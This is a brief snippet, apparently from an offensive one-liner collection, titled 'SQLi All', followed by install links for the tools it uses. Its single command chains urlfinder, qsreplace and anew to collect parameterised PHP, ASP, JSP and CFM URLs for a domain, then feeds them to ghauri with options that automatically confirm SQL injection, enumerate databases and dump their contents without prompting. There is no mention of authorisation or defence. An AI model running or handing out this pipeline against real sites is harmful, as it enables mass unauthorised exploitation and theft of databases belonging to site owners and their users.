### SQLi All
```
urlfinder -d "example.com" -all | grep -aE '\.(php|asp|aspx|jsp|cfm)' | qsreplace "SQLI" | grep -a "SQLI" | anew > sqli.txt;ghauri -m sqli.txt --random-agent --confirm --force-ssl --level=3 --dbs --dump --batch
```
<p>install <a href="https://github.com/projectdiscovery/urlfinder" target="_blank">urlfinder</a>, <a href="https://github.com/tomnomnom/qsreplace" target="_blank">qsreplace</a>, <a href="https://github.com/tomnomnom/anew" target="_blank">anew</a>, <a href="https://github.com/r0oth3x49/ghauri" target="_blank">ghauri</a></p>
